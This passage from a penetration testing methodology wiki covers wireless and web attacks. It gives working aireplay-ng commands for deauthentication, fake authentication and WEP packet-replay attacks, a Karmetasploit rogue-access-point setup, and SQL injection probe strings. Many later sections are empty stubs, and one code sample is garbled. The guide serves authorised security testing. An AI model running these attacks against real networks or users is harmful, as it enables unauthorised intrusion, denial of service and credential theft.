<p>A window with available network connections will open.  As you can see from the screenshot below, the list is split by the type of available network connections.  At the top you have [<a href="http://en.wikipedia.org/wiki/Dial-up">http://en.wikipedia.org/wiki/Dial-up</a> dial-up] and [<a href="http://en.wikipedia.org/wiki/VPN">http://en.wikipedia.org/wiki/VPN</a> virtual private network (VPN)] connections, while at the bottom you have a list of all the wireless networks which Windows 7 has detected.  To refresh the list of available networks, click on the button highlighted in the screenshot below.</p>
<p>[[:File:Penetration_Testing_Execution_150.png|Screenshot Here]]</p>
<p>You can scroll down through the list of available networks.  Once you decided on which network to connect to, click on it.  Next, click on the ''Connect'' button.</p>
<p>[[:File:Penetration_Testing_Execution_151.png|Screenshot Here]]</p>
<p>If everything is OK, Windows 7 will connect to the network you selected using the given security key.</p>
<h4 id="attacking-the-access-point">Attacking the Access Point</h4>
<p>All identified access points are vulnerable to numerous attacks.  For completeness, we've included some attack methods that may not be a part of all engagements.  Ensure that the scoping is reviewed prior to initiating any attacks.</p>
<h5 id="denial-of-service-dos">Denial of Service (DoS)</h5>
<p>Within the standard, there are two packets that help in this regard, the ''Clear To Send (CTS)'' and ''Request To Send (RTS)'' packets.  Devices use RTS packets when they have something big to send, and they don't want other devices to step on their transmission.  CTS packets are sent so that the device knows it's okay to transmit.  Every device (other than the one that sent the RTS) within the range of the CTS packet cannot transmit anything for the duration specified.</p>
<p>The first technique is to transmit the CTS packets, meaning that anyone in range of your signal will be unable to transmit.  This requires a high-gain Omni-directional antenna to a much greater impact.  The second technique is to send an RTS packet to the AP you are targeting.  Once the AP gets the RTS packet, it will send the CTS.  A highly directional antenna from a distance can be used to target the AP with an RTS packet.  Generally speaking, transmitting the CTS has a greater impact.</p>
<h4 id="cracking-passwords">Cracking Passwords</h4>
<h5 id="wpa-psk-wpa2-psk">WPA-PSK/ WPA2-PSK</h5>
<p>WPA-PSK is vulnerable to brute force attack.  Tools like Aircrack and coWPAtty take advantage of this weakness and provided a way to test keys against dictionaries.  The problem is that it's a very slow process.  Precomputational attacks are limited as the BSSID and the BSSID length are seeded into the passphrase hash.  This is why WPA-PSK attacks are generally limited due by time.  There is no difference between cracking WPA or WPA2, the authentication is essentially the same.</p>
<p>The main requirement for any WPA/WPA2 is to capture the authentication handshake and then use Aircrack-ng to crack the pre-shared key.  This can be done either actively or passively.  "Actively" means you will accelerate the process by deauthenticating an existing wireless client.  "Passively" means you simply wait for a wireless client to authenticate to the WPA/WPA2 network.</p>
<h5 id="wpawpa2-enterprise">WPA/WPA2-Enterprise</h5>
<p>In environments with a large number of users, such as corporations or universities, WPA/WPA2 pre-shared key management is not feasible.  For example, it wouldn't be possible to track which users are connected and it would be impossible to revoke access to the network for individuals without changing the key for everyone.  Therefore WPA2 Enterprise authenticates users against a user database (RADIUS).  Two common methods to do that are WPA2-EAP-TTLS and WPA2-PEAP.</p>
<h4 id="attacks">Attacks</h4>
<h5 id="leap">LEAP</h5>
<p>This stands for the Lightweight Extensible Authentication Protocol.  This protocol is based on 802.1X and helps minimize the original security flaws by using WEP and a sophisticated key management system.  This EAP-version is safer than EAP-MD5.  This also uses MAC address authentication.  LEAP is not safe against crackers.  THC-LeapCracker can be used to break Cisco's version of LEAP and be used against computers connected to an access point in the form of a dictionary attack.  Anwrap and asleap are other crackers capable of breaking LEAP.</p>
<h6 id="asleap">Asleap</h6>
<p>Asleap is a designed specifically to recover weak LEAP (Cisco's Lightweight Extensible Authentication Protocol) and PPTP passwords.  Asleap performs Weak LEAP and PPTP password recovery from pcap and AiroPeek files or from live capture.  Finally, it has the ability to deauthenticate clients on a leap WLAN (speeding up leap password recovery).</p>
<p>[[:File:Penetration_Testing_Execution_152.png|Screenshot Here]]</p>
<p>The first step involved in the use of asleap is to produce the necessary database (.dat) and index files (.idx) using genkeys from the supplied (-r) a dictionary (wordlist) file.</p>
<p>[[:File:Penetration_Testing_Execution_153.png|Screenshot Here]]</p>
<p>The final step in recovering the weak LEAP password is to run the asleap command with our newly created .dat and .idx files:</p>
<p>[[:File:Penetration_Testing_Execution_154.png|Screenshot Here]]</p>
<h5 id="8021x">802.1X</h5>
<p>802.1X is an IEEE Standard for port-based Network Access Control (PNAC).  It is part of the IEEE 802.1 group of networking protocols.  It provides an authentication mechanism to devices wishing to attach to a LAN or WLAN.</p>
<p>IEEE 802.1X defines the encapsulation of the Extensible Authentication Protocol (EAP) over IEEE 802 which is known as "EAP over LAN" or EAPOL.  There are two main attacks which can be used against 802.1X:<br></p>
<h6 id="key-distribution-attack">Key Distribution Attack</h6>
<p>The key distribution attack exploits a weakness in the RADIUS protocol.  The key distribution attack relies on an attacker capturing the PMK transmission between the RADIUS server and the AP.  As the PMK is transmitted outside of the TLS tunnel, its protection is solely reliant on the RADIUS server's HMAC-MD5 hashing algorithm.  Should an attacker be able to leverage a man-in-the-middle attack between the AP and RADIUS sever, a brute-force attempt could be made to crack the RADIUS shared secret.  This would ultimately provide the attacker with access to the PMK - allowing full decryption of all traffic between the AP and supplicant.</p>
<h6 id="radius-impersonation-attack">RADIUS Impersonation Attack</h6>
<p>The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator.  Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server.  Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user.  After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism.  This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline.</p>
<h5 id="peap">PEAP</h5>
<p>The Protected Extensible Authentication Protocol (Protected EAP or PEAP) is a protocol that encapsulates the Extensible Authentication Protocol (EAP) within an encrypted and authenticated Transport Layer Security (TLS) tunnel.  The purpose was to correct deficiencies in EAP; EAP assumed a protected communication channel, such as that provided by physical security, so facilities for protection of the EAP conversation were not provided.</p>
<h6 id="radius-impersonation-attack_1">RADIUS Impersonation Attack</h6>
<p>The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator.  Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server.  Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user.  After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism.  This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline.</p>
<h6 id="authentication-attack">Authentication Attack</h6>
<p>The PEAP authentication attack is a primitive means of gaining unauthorized access to PEAP networks.  By sniffing usernames from the initial (unprotected) PEAP identity exchange an attacker can attempt to authenticate to the target network by 'guessing' user passwords.  This attack is often ineffective as the authenticator will silently ignores bad login attempts ensuring a several second delay exists between login attempts.  <br></p>
<h5 id="eap-fast">EAP-Fast</h5>
<p>EAP-FAST (Flexible Authentication via Secure Tunneling) is Cisco's replacement for LEAP.  The protocol was designed to address the weaknesses of LEAP while preserving the "lightweight" implementation.  EAP-FAST uses a Protected Access Credential (PAC) to establish a TLS tunnel in which client credentials are verified.  EAP-FAST provides better protection against dictionary attacks, but is vulnerable to MITM attacks.  Since many implementations of EAP-FAST leave anonymous provisioning enabled, AP impersonation can reveal weak credential exchanges.</p>
<h5 id="wepwpawpa2">WEP/WPA/WPA2</h5>
<p>The core process of connecting to a WEP encrypted network revolves around obtaining the WEP key for the purpose of connecting to the network.  There are several tools that can be used to perform attacks against WEP.</p>
<h5 id="aircrack-ng">Aircrack-ng</h5>
<p>Aircrack-ng is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured.  It implements the standard FMS attack along with some optimizations like KoreK attacks, as well as the all-new PTW attack, thus making the attack much faster compared to other WEP cracking tools.</p>
<p>The first step is to place the wireless interface in monitor mode by entering: </p>
<pre>airmon-ng start wlan0</pre>

<p>'''Airmon-ng'''</p>
<p>Airmon-ng is used to enable monitor mode on wireless interfaces.  It may also be used to go back from monitor mode to managed mode.  Entering the airmon-ng command without parameters will show the interfaces status.</p>
<p>To start wlan0 in monitor mode: 
<pre>airmon-ng start wlan0</pre></p>
<p>To start wlan0 in monitor mode on channel 8: 
<pre>airmon-ng start wlan0 8</pre></p>
<p>To stop wlan0: 
<pre>airmon-ng stop wlan0</pre></p>
<p>To check the status: 
<pre>airmon-ng</pre></p>
<p>[[:File:Penetration_Testing_Execution_155.png|Screenshot Here]]</p>
<p>Enter "iwconfig" to validate the wireless interfaces.  The output should look similar to:</p>
<p>[[:File:Penetration_Testing_Execution_156.png|Screenshot Here]]</p>
<p>'''Airodump-ng'''</p>
<p>Airodump-ng is used for packet capturing of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vector) for the intent of using them with Aircrack-ng.  If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found access points.</p>
<p>Usage: 
<pre>airodump-ng <nowiki>&lt;</nowiki>options<nowiki>&gt;</nowiki> <nowiki>&lt;</nowiki>interface<nowiki>&gt;[</nowiki>,<nowiki>&lt;</nowiki>interface<nowiki>&gt;</nowiki>,...<nowiki>]</nowiki></p>
<p>Options:</p>
<p>--ivs               : Save only captured IVs</p>
<p>--gpsd              : Use GPSd</p>
<p>--write    <nowiki>&lt;</nowiki>prefix<nowiki>&gt;</nowiki> : Dump file prefix</p>
<p>-w                  : same as --write</p>
<p>--beacons           : Record all beacons in dump file</p>
<p>--update     <nowiki>&lt;</nowiki>secs<nowiki>&gt;</nowiki> : Display update delay in seconds</p>
<p>--showack           : Prints ack/cts/rts statistics</p>
<p>-h                  : Hides known stations for --showack</p>
<p>-f          <nowiki>&lt;</nowiki>msecs<nowiki>&gt;</nowiki> : Time in ms between hopping channels</p>
<p>--berlin     <nowiki>&lt;</nowiki>secs<nowiki>&gt;</nowiki> : Time before removing the AP/client</p>
<p>from the screen when no more packets</p>
<p>are received (Default: 120 seconds)</p>
<p>-r           <nowiki>&lt;</nowiki>file<nowiki>&gt;</nowiki> : Read packets from that file</p>
<p>-x          <nowiki>&lt;</nowiki>msecs<nowiki>&gt;</nowiki> : Active Scanning Simulation</p>
<p>--output-format</p>
<p><nowiki>&lt;</nowiki>formats<nowiki>&gt;</nowiki> : Output format. Possible values:</p>
<p>pcap, ivs, csv, gps, kismet, netxml</p>
<p>Short format "-o"</p>
<p>The option can be specified multiple   times.  In this case, each file format specified will be output.  Only ivs or pcap can be used, not both.</pre></p>
<p>[[:File:Penetration_Testing_Execution_157.png|Screenshot Here]]</p>
<p>[[:File:Penetration_Testing_Execution_158.png|Screenshot Here]]</p>
<p>'''Aireplay-ng'''</p>
<p>Aireplay-ng is primarily used to generate or accelerate traffic for the later use with Aircrack-ng (for cracking WEP keys).  Aireplay-ng supports various attacks such as deauthentication, fake authentication, Interactive packet replay, hand-crafted ARP request injection and ARP-request re injection.  Usage:</p>
<pre>aireplay-ng <nowiki><</nowiki>options<nowiki>></nowiki> <nowiki><</nowiki>replay interface<nowiki>></nowiki></pre>

<p>These are the attack names and their corresponding "numbers":</p>
<ul>
<li>'''Attack 0: '''Deauthentication</li>
<li>'''Attack 1: '''Fake authentication</li>
<li>'''Attack 2: '''Interactive packet replay</li>
<li>'''Attack 3: '''ARP request replay attack</li>
<li>'''Attack 4: '''KoreK chopchop attack</li>
<li>'''Attack 5: '''Fragmentation attack</li>
<li>'''Attack 9: '''Injection test</li>
</ul>
<p>Note: Not all options apply to all attacks.</p>
<p>'''Attack 0 - Deauthentication'''</p>
<p>A deauthentication attack sends disassociation packets to one or more clients who are currently associated with an AP. Disassociating clients can reveal a hidden / cloaked ESSID.  Deauthentication attacks also provide an ability to capture WPA/WPA2 handshakes by forcing clients to re-authenticate.  <br>
<pre>aireplay-ng -0 1 -a 34:EF:44:BB:14:C1 -c 00:E0:4C:6D:27:8D wlan0</pre></p>
<ul>
<li>-0 means deauthentication</li>
<li>1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously</li>
<li>-a 34:EF:44:BB:14:C1 is the MAC address of the access point</li>
<li>-c 00:E0:4C:6D:27:8D is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated</li>
<li>wlan0 is the interface name</li>
</ul>
<p>[[:File:Penetration_Testing_Execution_159.png|Screenshot Here]]</p>
<p>'''Attack 1 - Fake authentication'''</p>
<p>The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) and to associate with an AP.  This attack is useful in scenarios where there are no associated clients.  Note that fake authentication attacks do not generate ARP packets.</p>
<pre>aireplay-ng -1 0 -e 2WIRE696 -a 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0</pre>

<ul>
<li>-1 means fake authentication</li>
<li>0 reassociation timing in seconds</li>
<li>-e 2WIRE696 is the wireless network name</li>
<li>-a 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is our card MAC address</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p>[[:File:Penetration_Testing_Execution_160.png|Screenshot Here]]</p>
<p>'''Attack 3 - ARP Request Replay Attack'''</p>
<p>The classic ARP request replay attack is the most effective way to generate new initialization vectors.  This attack is probably the most reliable of all.  The program listens for an ARP packet then retransmits it back to the AP.  This, in turn causes the AP to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over.  However, each ARP packet repeated by the AP has a new IV.  The collection of these IVs will later help us later in determining the WEP key.</p>
<pre>aireplay-ng -3 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0</pre>

<ul>
<li>-3 means standard arp request replay</li>
<li>-b 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication)</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p>'''Attack 4 - KoreK chopchop'''</p>
<p>The KoreK chopchop attack can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP.  ''This attack does not recover the WEP key itself, it merely reveals the plaintext''. Some APs are not vulnerable to this attack.  They may seem vulnerable at first but actually drop data packets shorter than 60 bytes.  If the AP drops packets shorter than 42 bytes, Aireplay tries to guess the rest of the missing data, as far as the headers are predictable.  If an IP packet is captured Aireplay checks if the checksum of the header is correct after guessing its missing parts.  Remember that this attack requires at least one WEP data packet.</p>
<pre>aireplay-ng -4 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0</pre>

<ul>
<li>-4 means the chopchop attack</li>
<li>-b 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication)</li>
<li>wlan0 is the wireless interface name
'''Attack 5 - Fragmentation Attack'''</li>
</ul>
<p>The fragmentation attack does not recover the WEP key itself, but (also) obtains the PRGA (pseudo random generation algorithm) of the packet.  The PRGA can then be used to generate packets with Packetforge-ng which are in turn are used for various injection attacks.  The attack requires at least one data packet to be received from the AP in order to initiate the attack.  Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the AP.  If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet.  This cycle is repeated several times until 1500 bytes of PRGA are obtained (sometimes less than 1500 bytes).</p>
<pre>aireplay-ng -5 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0</pre>

<ul>
<li>-5 means run the fragmentation attack</li>
<li>-b 34:EF:44:BB:14:C1 is the access point MAC address</li>
<li>-h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication)</li>
<li>wlan0 is the wireless interface name</li>
</ul>
<p>'''Attack 9: Injection test'''</p>
<p>The injection test determines if your card can successfully inject wireless packets, and measures ping response times to APs.  If you have two wireless cards connected, the test can also determine which specific injection attacks can be successfully executed.  The basic injection test lists the APs in the area which respond to broadcast probes, and for each it performs a 30 packet test which measures the connection quality.  This connection quality quantifies the ability of your card to successfully send and receive a response to the test target.  The percentage of responses received gives a good indication of the link quality.</p>
<pre>aireplay-ng -9 wlan0</pre>

<p>Where:</p>
<ul>
<li>-9 - Injection test.</li>
<li>wlan0 - the interface name</li>
</ul>
<p>[[:File:Penetration_Testing_Execution_161.png|Screenshot Here]]</p>
<p>'''Aircrack-ng'''</p>
<p>Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.  Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng.  This part of the Aircrack-ng suite determines the WEP key using two fundamental methods.  The first method is via the PTW approach (Pyshkin, Tews, and Weinmann).  The default cracking method is PTW.</p>
<p>For cracking WPA/WPA2 pre-shared keys, only a dictionary method is used.  SSE2 support is included to dramatically speed up WPA/WPA2 key processing.  A "four-way handshake" is required as input.  For WPA handshakes, a full handshake is composed of four packets.  However, Aircrack-ng is able to work successfully with just 2 packets.  EAPOL packets (2 and 3) or packets (3 and 4) are considered a full handshake.</p>
<h3 id="attacking-the-user">Attacking the User</h3>
<p>The Rules of Engagment (ROE) should be validated to ensure this is in-scope before conducting any attacks against the users </p>
<h5 id="karmetasploit-attacks">Karmetasploit Attacks</h5>
<p>Karmetasploit is a modification of the KARMA to integrate it into Metasploit.  Karmetasploit creates a working "evil" access point working that provides network services to an unsuspecting user.  The services Karmetasploit provides include a DNS daemon that responds to all requests, a POP3 service, an IMAP4 service, a SMTP service, a FTP service, a couple of different SMB services, and a web service.  All DNS lookups result in the IP address of the access point being returned, resulting in a blackhole effect for all email, web, and other network traffic.</p>
<p>To run Karmetasploit, use aireplay-ng to verify that injection is functioning:</p>
<pre># aireplay-ng --test [monitor-interface] </pre>

<p>The output of aireplay-ng should indicate that injection is working and that one of the local access points could be reached. If every access point returns 0% and the message indicating injection is working is not there, you likely need to use a different/patched driver or a different wireless card.</p>
<p>The Metasploit Framework does not have a DHCP module, so a third-party DHCP service must be configured and installed. The easiest way to accomplish this is by installed the "dhcpd" package. On Backtrack 4 R2, the package is called "dhcpd3"or on Backtrack 5, the package is called "dhcp3-server".</p>
<pre>apt-get install dhcp3-server </pre>

<p>Once the DHCP server has been installed, an appropriate configuration file needs to be created. This file is normally called "dhcpd.conf" or "dhcpd3.conf" and resides in /etc, /etc/dhcp, or /etc/dhcp3. The example below uses the 10.0.0.0/24 network with the access point configured at 10.0.0.1.</p>
<pre>default-lease-time 60;
max-lease-time 72;

ddns-update-style none;

authoritative;

log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.100 10.0.0.254;
  option routers 10.0.0.1;
  option domain-name-servers 10.0.0.1;
}
</pre>

<p>To run Karmetasploit, there are three things that need to happen. First, airbase-ng must be started and configured as a greedy wireless access point. The following example will beacon the ESSID of the target company, respond to all probe requests, and rebroadcast all probes as beacons for 30 seconds:</p>
<pre>airbase-ng -P -C 30 -e "<COMPANY ESSID>" -v [monitor-interface]</pre>

<p>Second, we need to configure the IP address of the at0 interface to match. </p>
<pre>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</pre>

<p>Third, the DHCP server needs to be started on the "at0" TUN/TAP interface created by airbase-ng:</p>
<pre>dhcpd -cf /etc/dhcpd.conf at0</pre>

<p>Finally, the Metasploit Framework itself needs to be configured. While its possible to configure each service by hand, its more efficient to use a resource file with the msfconsole interface. A sample resource file, configured to use 10.0.0.1 as the access point address, with nearly every feature enabled, can be downloaded here [<a href="http://digitaloffense.net/tools/karma.rc">http://digitaloffense.net/tools/karma.rc</a>]. To use this resource file, run msfconsole with the -r parameter. Keep in mind that msfconsole must be run as root for the capture services to function.</p>
<pre>msfconsole -r karma.rc</pre>

<p>Once the Metasploit Framework processes the commands in the resource file, the standard msfconsole shell will be available for commands. As clients connect to the access point and try to access the network, the service modules will do what they can to extract information from the client and exploit browser vulnerabilities.</p>
<h5 id="dns-requests">DNS Requests</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="bluetooth">Bluetooth</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="personalized-rogue-ap">Personalized Rogue AP</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<ul>
<li>DoS / Blackmail angle</li>
</ul>
<h5 id="web">Web</h5>
<p>A web application involves a web server that accepts input and is most often interfaced using http(s). The penetration tester’s goal is to discover any interaction points that can be manipulated to access information, functionality or services beyond the web applications intended use.
Quite often a web application will comprise of tiers. The tiers are generally broken up into web, application, and data. These tiers can run on one or more servers, and any of the tiers may be load balanced across multiple servers. 
In the quest to find all the entry points, during the intelligence gathering and vulnerability analysis phase the penetration tester will utilize mostly GET and POST requests but should also test head, put, delete, trace, options, connect and patch. The objective is to map all input and output points. These are not limited to simply forms on a page, but include cookies, links, hidden forms, http parameters, etc.
During the exploration particular attention should be given to sessions, cookies, error pages, http status codes, indirectly accessible pages, encryption usage and server configuration, dns and proxy cache usage.
Ideally, this will be done using both automated and manual methods to discover potential ways to manipulate the web application parameters or logic. This is generally done using some form of client application (browser) and a proxy that can sit between the client application and the web application, and a tool to crawl (aka spider) through page links.</p>
<h6 id="sql-injection-sqli">SQL Injection (SQLi)</h6>
<p>According to OWASP (<a href="https://www.owasp.org/index.php/SQL_Injection">https://www.owasp.org/index.php/SQL_Injection</a>) SQL Injection, or as it is more commonly known SQLi, consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. </p>
<p>SQL (Structured Query Language) is an interpretted programming language for interfacing with a database. It is sometimes also lazily used to refer to the database management system. 
Applications utilize a database to store/retrieve and process information. The database is usually a relational database, where data is stored in one more tables, each table has values in one or more columns (data types/attributes) and rows (element/tuple).
There are several implementations of SQL and each has their own commands and syntax. A few common commands are:
select - retrieve data
union - combine results of two or more selects
insert - add new data
update - modify existing data
delete - delete data</p>
<p>What is injection?
Simply stated, SQL injection exploits a vulnerability that allows data sent to an application to be interpreted and run as SQL commands. </p>
<p>According to OWASP (<a href="https://www.owasp.org/index.php/SQL_Injection">https://www.owasp.org/index.php/SQL_Injection</a>) SQL Injection, also known as  SQLi, consists of insertion or "injection" of a SQL query via the input data from the client to the application. </p>
<p>A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. 
SQL injection is typically discovered in the Vulnerability Analysis phase (and maybe hinted at in the intelligence gathering phase) of the engagement.</p>
<p>One possible way to test for sql injection is to enter a ' into input fields then compare the application response to a well formed request. If the web application is vulnerable to SQLi, a ' may return different results when the SQL statement attempts to execute. Was an error message returned, different results, web page a different size, are different HTTP codes returned. Don't forget to look at the source, not just what is displayed in the browser. 
Depending on the reaction, it may be necessary to use other tests for injection, for example " or '; or ) or '+"#' or %27%20or%201#1. It may also be necessary to encode the characters to bypass filters.
If the access to the source code of the application is available, review for any variables where input can be manipulated as part of the application usage. In some cases this will be readily apparent, for instance
php <span><span class="MathJax_Preview">sql # "SELECT * from [table] WHERE tuple # '</span><script type="math/tex">sql # "SELECT * from [table] WHERE tuple # '</script></span>_GET("input"]'";<br />
c# $sql # "SELECT * from [table] WHERE tuple # '" + request.getParameter("input") # "'";</p>
<p>Several tools are available for the identification and exploitation of SQLi </p>
<p>Several tools are available for the identification and exploitation of SQLi.
SQLi Tools
*Havij (<a href="http://itsecteam.com/en/projects/project1.htm">http://itsecteam.com/en/projects/project1.htm</a>)
*SQLmap (<a href="http://sqlmap.sourceforge.net">http://sqlmap.sourceforge.net</a>)
*The Mole (<a href="http://sourceforge.net/projects/themole">http://sourceforge.net/projects/themole</a>)
*Pangolin (<a href="http://nosec.org/en/productservice/pangolin">http://nosec.org/en/productservice/pangolin</a>)</p>
<h6 id="xss">XSS</h6>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h6 id="csrf">CSRF</h6>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="ad-hoc-networks">Ad-Hoc Networks</h5>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>Information Leakage</li>
</ul>
<h5 id="detection-bypass">Detection bypass</h5>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>FW/WAF/IDS/IPS Evasion</li>
<li>Human Evasion</li>
<li>DLP Evasion</li>
</ul>
<h5 id="resistance-of-controls-to-attacks">Resistance of Controls to attacks</h5>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<h5 id="type-of-attack">Type of Attack</h5>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>Client Side</li>
<li>Phishing (w/pretext)</li>
<li>Service Side</li>
<li>Out of band</li>
<li>Post-Exploitation</li>
<li>Infrastructure analysis</li>
</ul>
<h5 id="the-social-engineer-toolkit">The Social-Engineer Toolkit</h5>
<p>The Social-Engineering Toolkit (SET) is a python-driven suite of custom tools which solely focuses on attacking the human element of pentesting. It’s main purpose is to augment and simulate social-engineering attacks and allow the tester to effectively test how a targeted attack may succeed. Currently SET has two main methods of attack, one is utilizing Metasploit payloads and Java-based attacks by setting up a malicious website (which you can clone whatever one you want) that ultimately delivers your payload. The second method is through file-format bugs and e-mail phishing. The second method supports your own open-mail relay, a customized sendmail open-relay, or Gmail integration to deliver your payloads through e-mail. The goal of SET is to bring awareness to the often forgotten attack vector of social-engineering. You can see detailed [<a href="http://www.secmaniac.com/tutorials/">http://www.secmaniac.com/tutorials/</a> tutorials here] or by downloading the [<a href="http://svn.secmaniac.com/social_engineering_toolkit/readme/User_Manual.pdf">http://svn.secmaniac.com/social_engineering_toolkit/readme/User_Manual.pdf</a> user manual here].</p>
<h3 id="vpn-detection">VPN detection</h3>
<p>VPN Hunter (<a href="http://www.vpnhunter.com">http://www.vpnhunter.com</a>) discovers and classifies SSL VPNs from top vendors including Juniper, Cisco, Palo Alto, Citrix, Fortinet, F5, SonicWALL, Barracuda, Microsoft, and Array. VPN Hunter will also attempt to detect whether two-factor authentication is enabled on the target SSL VPNs.</p>
<h3 id="route-detection-including-static-routes">Route detection, including static routes</h3>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="network-protocols-in-use">Network Protocols in use</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h5 id="proxies-in-use">Proxies in use</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span>
* Network Level
* Application Level</p>
<h5 id="network-layout">Network layout</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<ul>
<li>Mapping connectivity in/out of every segment</li>
<li>Lateral connectivity</li>
</ul>
<h5 id="high-valueprofile-targets">High value/profile targets</h5>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h3 id="pillaging">Pillaging</h3>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h4 id="video-cameras">Video Cameras</h4>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h4 id="data-exfiltration">Data Exfiltration</h4>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>identify web servers</li>
<li>identify ftp servers</li>
<li>DNS and ICMP tunnels</li>
<li>VoIP channels</li>
<li>Physical channels (printing, garbage disposal, courier)</li>
<li>Fax (on multifunction printers)</li>
</ul>
<h4 id="locating-shares">Locating Shares</h4>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h4 id="audio-capture">Audio Capture</h4>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<ul>
<li>VoIP</li>
<li>Microphone</li>
</ul>
<h4 id="high-value-files">High Value Files</h4>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<h4 id="database-enumeration">Database Enumeration</h4>
<p><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></p>
<ul>
<li>Checking for PPI</li>
<li>card data</li>
<li>passwords/user accounts</li>
</ul>
<h4 id="wifi">Wifi</h4>
<p><span style#"background-color:yellow;"><span style#"background-color:yellow;"><nowiki>&lt;</nowiki>Contribution Needed<nowiki>&gt;</nowiki></span></span></p>
<ul>
<li>Steal wifi keys</li>
<li>Add new Wifi entries with higher preference then setup AP to force<br>connection</li>
<li>Check ESSIDs to identify places visited</li>
</ul>
<h4 id="source-code-repos">Source Code Repos</h4>
